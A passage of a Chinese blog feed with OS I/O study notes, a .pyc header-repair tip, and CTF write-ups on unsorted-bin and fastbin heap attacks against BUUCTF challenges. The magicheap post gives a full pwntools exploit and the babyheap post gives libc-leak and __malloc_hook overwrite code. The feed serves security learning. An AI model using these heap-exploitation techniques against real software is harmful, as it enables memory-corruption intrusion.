效率低</p>\n<p>每次读写一个字</p>\n<p>cpu 和 io 可并行工作</p>\n<p>3、DMA 方式：直接存储器存取</p>\n<p>数据单位：连续的多个块</p>\n<p>直接从设备到内存</p>\n<p>减少了 cpu 干预</p>\n<p>DR：数据寄存器</p>\n<p>MAR：内存地址寄存器</p>\n<p>DC：剩余读写字节数</p>\n<p>CR：命令 / 状态寄存器</p>\n<p>4、通道控制方式</p>\n<p>弱鸡版 cpu</p>\n<p>通道程序：任务清单</p>\n<p>cpu 发送命令给通道，然后让通道处理 IO 操作就行了</p>\n<p>处理完了，向 cpu 发送中断信号</p>\n<h3 id=\"51_4-i-o软件层次结构\"><a class=\"markdownIt-Anchor\" href=\"#51_4-i-o软件层次结构\">#</a> 5.1_4 I-O 软件层次结构</h3>\n<p>1、用户层软件</p>\n<p>实现与用户交互的接口，向上提供方便易用的库函数</p>\n<p>2、设备独立性软件（设备无关性软件）</p>\n<p>向上层提供统一的调用接口（read/write）</p>\n<p>设备的保护</p>\n<p>差错处理</p>\n<p>设备的分配与回收</p>\n<p>数据缓冲区管理</p>\n<p>建立逻辑设备名到物理设备名的映射关系</p>\n<p>根据设备类型选择调用相应的驱动程序</p>\n<p>3、设备驱动程序（比如打印机驱动）</p>\n<p>设置设备寄存器、检查设备状态</p>\n<p>4、中断处理程序</p>\n<p>进行中断处理</p>\n<p>5、硬件</p>\n<p>执行 IO 操作，有机械部件、电子部件组成</p>\n<h3 id=\"51_5-i-o核心子系统\"><a class=\"markdownIt-Anchor\" href=\"#51_5-i-o核心子系统\">#</a> 5.1_5 I-O 核心子系统</h3>\n<p>1、用户层软件</p>\n<p>假脱机系统</p>\n<p>2、设备独立性软件（设备无关性软件）</p>\n<p>IO 调度、设备保护、设备分配与回收、缓冲区管理</p>\n<p>3、设备驱动程序（比如打印机驱动）</p>\n<p>4、中断处理程序</p>\n<p>5、硬件</p>\n<h3 id=\"51_6-假脱机技术\"><a class=\"markdownIt-Anchor\" href=\"#51_6-假脱机技术\">#</a> 5.1_6 假脱机技术</h3>\n<p>1、什么是脱机技术，脱机技术可以解决什么问题</p>\n<p>脱离主机的控制进行输入 / 输出控制</p>\n<p>SPPOLing 系统：必须要有多道程序并发进行</p>\n<p>2、假脱机技术的实现原理</p>\n<ul>\n<li>输入井和输出井</li>\n<li>输入进程和输出进程</li>\n<li>输入缓冲区和输出缓冲区</li>\n</ul>\n<p>3、共享打印机的原理分析</p>\n<h3 id=\"51_7-设备的分配与回收\"><a class=\"markdownIt-Anchor\" href=\"#51_7-设备的分配与回收\">#</a> 5.1_7 设备的分配与回收</h3>\n<p>1、设备分配时应考虑的因素</p>\n<p>设备的固有属性：独占设备、共享设备、虚拟设备</p>\n<p>设备分配算法：</p>\n<p>设备分配中的安全：为进程分配一个设备后就将进程阻塞，本次 IO 完成后才将进程唤醒</p>\n<p>2、静态分配与动态分配</p>\n<p>静态分配：进程运行前为其分配全部所需资源、运行结束后归还资源</p>\n<p>动态分配：运行中动态分配</p>\n<p>3、设备分配管理中的数据结构</p>\n<p>树</p>\n<p>系统设备表 SDT，表目：（设备类型、设备标识符、DCT、驱动程序入口）</p>\n<p>设备控制表 DCT（设备类型、设备标识符、设备状态、指向控制器表的指针、重复执行次数或事件、设备队列的队首指针）</p>\n<p>控制器控制表 COCT（控制器标识符、控制器状态、指向通道表的指针设备队列的队首指针、控制器队列的队尾指针）</p>\n<p>通道控制表 CHCT（通道标识符、通道状态、与通道连接的控制器表首址、通道队列的队首指针、通道队列的队尾指针）</p>\n<p>4、设备分配的步骤</p>\n<p>根据进程请求的物理设备名 ——&gt; 设备控制表 ——&gt; 控制器控制表 ——&gt; 通道</p>\n<p>5、设备分配步骤的改进方法</p>\n<p>建立逻辑设备名和设备的映射</p>\n<h3 id=\"51_8-缓冲区管理\"><a class=\"markdownIt-Anchor\" href=\"#51_8-缓冲区管理\">#</a> 5.1_8 缓冲区管理</h3>\n<p>1、什么时缓冲区？有什么作用？</p>\n<p>缓冲区是一个存储区域</p>\n<p>缓和 CPU 与 IO 设备之间速度不匹配的矛盾</p>\n<p>减少对 CPU 的中断频率</p>\n<p>解决数据粒度不匹配的问题</p>\n<p>提高 CPU 与 IO 设备之间的并行性</p>\n<p>2、单缓冲</p>\n<p>在内存中分配一块缓冲区</p>\n<p>处理一块时间 = max（C,T)+M</p>\n<p>3、双缓冲</p>\n<p>在内存中分配两块缓冲区</p>\n<p>max(T,C+M)</p>\n<p>4、循环缓冲</p>\n<p>5、缓冲池</p>\n<p>由系统中共用的缓冲区组成。这些缓冲区可以分为：空缓冲队列、装满输入数据的缓冲队列、装满输出数据的缓冲队列</p>\n<p>转载至<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzY4NTkxNjc5L2FydGljbGUvZGV0YWlscy8xMjg3MjUwMzI/b3BzX3JlcXVlc3RfbWlzYz0lN0IlMjJyZXF1ZXN0JTVGaWQlMjIlM0ElMjIxNjg5NzcwNzc4MTY4MDAyMjI4MjE3NjUlMjIlMkMlMjJzY20lMjIlM0ElMjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyMiU3RCZhbXA7cmVxdWVzdF9pZD0xNjg5NzcwNzc4MTY4MDAyMjI4MjE3NjUmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH50b3BfcG9zaXRpdmV+ZGVmYXVsdC0xLTEyODcyNTAzMi1udWxsLW51bGwuMTQyJTVFdjkwJTVFY2hhdHNlYXJjaCwyMzklNUV2MiU1RWluc2VydF9jaGF0Z3B0JmFtcDt1dG1fdGVybT1MaXR0bGVYaSZhbXA7c3BtPTEwMTguMjIyNi4zMDAxLjQxODc=\">) 【LittleXi】操作系统_Little Xi 的博客 - CSDN 博客</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/05/13/pyc%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D/",
            "url": "http://example.com/2023/05/13/pyc%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BF%AE%E5%A4%8D/",
            "title": "pyc文件头修复",
            "date_published": "2023-05-13T08:45:51.000Z",
            "content_html": "<p>首先题目给了 pyc 文件为 python 37</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164118025.png\" alt=\"image-20230513164118025\"></p>\n<p>然后 010editor 打开</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164147988.png\" alt=\"image-20230513164147988\"></p>\n<p>发现文件头为 00  到 E3 那里都是 0  猜测文件头损坏</p>\n<pre><code>enum PycMagic &#123;\n    MAGIC_1_0 = 0x00999902,\n    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */\n    MAGIC_1_3 = 0x0A0D2E89,\n    MAGIC_1_4 = 0x0A0D1704,\n    MAGIC_1_5 = 0x0A0D4E99,\n    MAGIC_1_6 = 0x0A0DC4FC,\n\n    MAGIC_2_0 = 0x0A0DC687,\n    MAGIC_2_1 = 0x0A0DEB2A,\n    MAGIC_2_2 = 0x0A0DED2D,\n    MAGIC_2_3 = 0x0A0DF23B,\n    MAGIC_2_4 = 0x0A0DF26D,\n    MAGIC_2_5 = 0x0A0DF2B3,\n    MAGIC_2_6 = 0x0A0DF2D1,\n    MAGIC_2_7 = 0x0A0DF303,\n\n    MAGIC_3_0 = 0x0A0D0C3A,\n    MAGIC_3_1 = 0x0A0D0C4E,\n    MAGIC_3_2 = 0x0A0D0C6C,\n    MAGIC_3_3 = 0x0A0D0C9E,\n    MAGIC_3_4 = 0x0A0D0CEE,\n    MAGIC_3_5 = 0x0A0D0D16,\n    MAGIC_3_5_3 = 0x0A0D0D17,\n    MAGIC_3_6 = 0x0A0D0D33,\n    MAGIC_3_7 = 0x0A0D0D42,\n    MAGIC_3_8 = 0x0A0D0D55,\n    MAGIC_3_9 = 0x0A0D0D61,\n&#125;;\n</code></pre>\n<p>这些事常用的 python 文件头  修改文件头为 MAGIC_3_7 注意小端序也就是 42 0D 0D 0A</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230513164325195.png\" alt=\"image-20230513164325195\"></p>\n<p>uncompyle6 -o <span class=\"exturl\" data-url=\"aHR0cDovL3Rlc3QucHk=\">test.py</span> 2.pyc</p>\n<p>然后使用 uncompyle6 即可成功反编译出来源码  uncompyle6 使用 pip install uncompyle6 安装</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/05/11/unsorted%20bin%20attack/",
            "url": "http://example.com/2023/05/11/unsorted%20bin%20attack/",
            "title": "unsortedbin attack",
            "date_published": "2023-05-11T13:26:54.000Z",
            "content_html": "<h2 id=\"unsortedbin-attack\"><a class=\"markdownIt-Anchor\" href=\"#unsortedbin-attack\">#</a> unsortedbin attack</h2>\n<p>Unsorted Bin Attack 从字面上就可以看出，正合适一种针对 Unsorted Bin 机制的攻击手法。这种攻击手法实现的前提是能够控制挂进 unsorted bin 中的 chunk 的 bk 指针，在控制 bk 指针的情况下可以实现修改任意地址值为一个较大的数值</p>\n<p>首先没有 chunk 挂入的时候 unsorted bin 的 fd 和 bk 指向自己</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511195726092.png\" alt=\"image-20230511195726092\"></p>\n<p>如果有一个 chunk 进入 unsorted bin 时那么该春 chunk 的 fd 和 bk 都会指向 unsorted bin</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511200319409.png\" alt=\"image-20230511200319409\"></p>\n<p>fd 和 bk 指向 unsortedbin 的头</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511200339778.png\" alt=\"image-20230511200339778\"></p>\n<p>如果你修改 chunk400 的 bk 为 magic-0x10  也就是你 free 之后的 chunk_400 的 bk 为 magic-0x10 那么你就可以修改 magic 的值为较大值</p>\n<p>为什么减去 0x10  因为 magic 的地址是 magic 的存储地址  而减去 0x10 之后的值才是 magic 的 malloc 之后的头地址  也就是 prev_size 的地址</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511202116589.png\" alt=\"image-20230511202116589\"></p>\n<p>然后你重新申请一个堆块  假设 chunk_400 的大小为 0x80  那么你重新申请一个 0x80 大小的堆块  就会把 chunl_400 申请走</p>\n<p>然后 magic-0x10 的这个堆块还在 那么 unsorted bin 的 fd 和 bk 就会指向 magic-0x10 的地方  然后 magic-0x10 的 fd 指针也就是 magic</p>\n<p>就会指向 unsorted bin  同时 magic 的值就会改变为较大的值</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511203517278.png\" alt=\"image-20230511203517278\"></p>\n<p>修改前 chunk2 的 fd 和 bk 指向 unsorted bin 的头</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511203637349.png\" alt=\"image-20230511203637349\"></p>\n<p>修改后 chunk2 的 bk 指向 0x602090 也就是 magic-0x10 处   magic 为 0x6020c0</p>\n<p>这个是修改前的 0x6020c0 的大小</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511204039362.png\" alt=\"image-20230511204039362\"></p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511212336461.png\" alt=\"image-20230511212336461\"></p>\n<p>这个是修改后的 0x6020c0 的大小</p>\n<p>add (0x80,‘dddd’)  只有申请一个新的堆块之后才能修改 magic 的值</p>\n<p>具体看前面  已经说过了</p>\n<p>buuctf hitcontraining_magicheap</p>\n<p>// 题目的 magic 地址为 0x6020c0  但是打远程的时候是 0x6020a0 不清楚为什么</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230509142800500.png\" alt=\"image-20230509142800500\"></p>\n<p>没有限制输入的数组大小所以存在堆溢出</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230509142849458.png\" alt=\"image-20230509142849458\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># r=process(\"1\")</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26699</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Heap : \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"heap:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Heap : \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"heap : \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span><span class=\"token string\">'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">'bbbb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span><span class=\"token string\">'cccc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>magic <span class=\"token operator\">=</span> <span class=\"token number\">0x6020A0</span><span class=\"token operator\">//</span>magic的地址  附件估计错了</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>magic<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">'dddd'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4869'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://example.com/2023/04/17/Fastbin%20Attack/",
            "url": "http://example.com/2023/04/17/Fastbin%20Attack/",
            "title": "BUUCTF babyheap_0ctf_2017",
            "date_published": "2023-04-17T00:34:11.000Z",
            "content_html": "<h2 id=\"buuctf-babyheap_0ctf_2017\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-babyheap_0ctf_2017\">#</a> BUUCTF babyheap_0ctf_2017</h2>\n<p>首先申请了 4 个堆  然后 free (1) 和 free (2) 接着修改 #2 的 fd 指向 #4 所在的位置  制造出 #4 被 free 的假象</p>\n<p>然后修改 #4 的 size 位来避开 malloc 的检查。因为我们之后想在 chunk4 的地方重新 malloc</p>\n<p>但是 malloc 的时候会检查 size 是否和要分配的大小相同，这就是为什么上面代码中我们要把 chunk4 的 size 位修改为 0x21</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415220317229.png\" alt=\"image-20230415220317229\"></p>\n<p>然后重新申请了</p>\n<p>allocate(0x10)<br>\nallocate(0x10)</p>\n<p>这里可以看一下结构体内存位置 发现下标为 1 和下标为 2 的内存全为 0 也就是都被 free 掉了</p>\n<p>所以第一个 allocate (0x10) 的内存地址指向下标为 1 的</p>\n<p>第二个 alloca (0x10) 虽然是在 #4 堆块申请了地址 但是会去到下标为 2 的结构体中  但是内存地址指向了 #4 所在的内存地址</p>\n<p>可以用这个看结构体所在位置  一般第一个就是的</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221026909.png\" alt=\"image-20230415221026909\"></p>\n<p>x/1000gx 0x321776f75000  尽量多向后找点</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221139838.png\" alt=\"image-20230415221139838\"></p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221337737.png\" alt=\"image-20230415221337737\"></p>\n<p>可以看到 allocate 后下标为 2 的结构体内存地址指向堆块 #4 和下标为 4 指向的堆块一样</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>0fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>1、fill (3,payload) 其实是将 chunk4 的 size 位变为之前的 0x91<br>\n2、allocate (0x80) 用来分割 top chunk 和 chunk4，防止堆块合并，因为我们后面要 free (4)<br>\n 3、free (4) 之后，chunk4 会被放到 unsorted bin 中。此时 chunk4 的 fd 指针是 unsorted bin 链表的头部，这个地址为 main_arena + 0x58</p>\n<p>可以看到 0x91 那里已经 free 了所以不能 dump 输出</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416211452367.png\" alt=\"image-20230416211452367\"></p>\n<p>同时查看内存发现 index 为 4 那里为空证明已经被 free 了 而 index 为 2 那里的内存指向 index4 所以可以 dump 出来</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416211534372.png\" alt=\"image-20230416211534372\"></p>\n<p>然后查看结构体中的内存地址 不是堆中的 可以发现下标为 2 的内存地址指向下标为 4 的所以 dump 输出时输出下标为 2 的</p>\n<p>可以输出 chunk4 中的内容</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>malloc_hook<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">88</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>libc_base<span class=\"token operator\">=</span>malloc_hook<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>因为 dump (2) 那里会输出 main_arena + 0x58 的地址所以需要减去 0x58 再减去 0x10 会找到 malloc_hook 的地址</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416212411772.png\" alt=\"image-20230416212411772\"></p>\n<p>然后 libcbase 的偏移就可以算出来了</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>此时 chunk4 是 unsorted bin。大小为 0x80，此时我们需要分配 0x60。会从 chunk4 里分割出来。我们把他定义为 chunk6，虽然是 chunk6，但是他在结构体数组中的索引为 4。因为 index 为 4 那里为空  所以他的内存地址为 chunk4</p>\n<p>free (4)  4 是下标为 4 所以 free 的是才申请的 chunk6</p>\n<p>这两步主要用来将 chunk4 分离出一个 fasbin 大小的 chunk6，然后再 free。chunk6 进入 fastbin。之后我们可以通过修改 chunk2 修改 chunk6 的值，然后再 malloc，进行 fastbin attack，可以任意地址分配。修改任意内存。</p>\n<p>我们现在需要修改 <code>__malloc_hook</code>  的值。我们先找到 <code>__malloc_hook</code>  的地址</p>\n<p>然后查看该 <code>__malloc_hook</code>  附近的内存空间。</p>\n<p>我们想要在这范围内进行 malloc，就需要绕过 malloc 的限制。我们发现附近 <code>7f</code>  比较多，我们可以找一个内存地址，将 <code>7f</code>  当为我们要 malloc 的 size 位。</p>\n<p>例如如下的内存地址， <code>0x7fd25e3b7aed</code> 。如果我们在这个地址进行 malloc，则 size 位为 0x7f。那我们分配一个 0x60 大小的 chunk，即可绕过 malloc 的限制。</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416213543205.png\" alt=\"image-20230416213543205\"></p>\n<p>最后一个字节是 7f 所以从 0x7f215166daed</p>\n<p>算出偏移为 0x3c4aed</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x3c4aed</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>第一个 allocate (0x60) 分配到 chunk6</p>\n<p>也就是下标为 4 的那里</p>\n<p>第二个 allocate (0x60) 分配的是下标为 6 的 chunk 这里可以动调看一下结构体内存就懂了</p>\n<p>修改完还没分配  可以看到 fd 那里是 libc_base+0x3c4aed</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416215139905.png\" alt=\"image-20230416215139905\"></p>\n<p>第二个 allocate (0x60) 直接看堆是看不到的  需要看结构体指针那里 前面说过怎么看  会发现他的内存地址为 libc_base+0x3c4aed+0x10</p>\n<p>为什么加了 0x10  可能是前面的下标和判断是否存在占了 0x10  具体还不是很懂</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x4526a</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416214511799.png\" alt=\"image-20230416214511799\"></p>\n<p>这里的 fill (6) 是修改的下标为 6 的结构体指针</p>\n<p><img data-src=\"https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416220041895.png\" alt=\"image-20230416220041895\"></p>\n<p>修改的是下标为 6 